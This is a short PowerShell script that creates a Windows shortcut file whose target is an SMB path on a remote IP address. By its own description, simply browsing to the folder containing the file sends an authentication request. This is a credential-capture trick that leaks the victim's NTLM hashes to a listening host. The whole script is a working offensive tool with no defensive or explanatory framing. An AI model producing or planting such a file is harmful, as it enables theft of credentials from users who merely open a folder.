$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\Users\RleeA\OneDrive\vsWorkspace\Code\GitHubProjects\Tradecraft")
$lnk.TargetPath = "\\172.16.9.197\gotem.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the dir this file lives in will perform an authentication request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()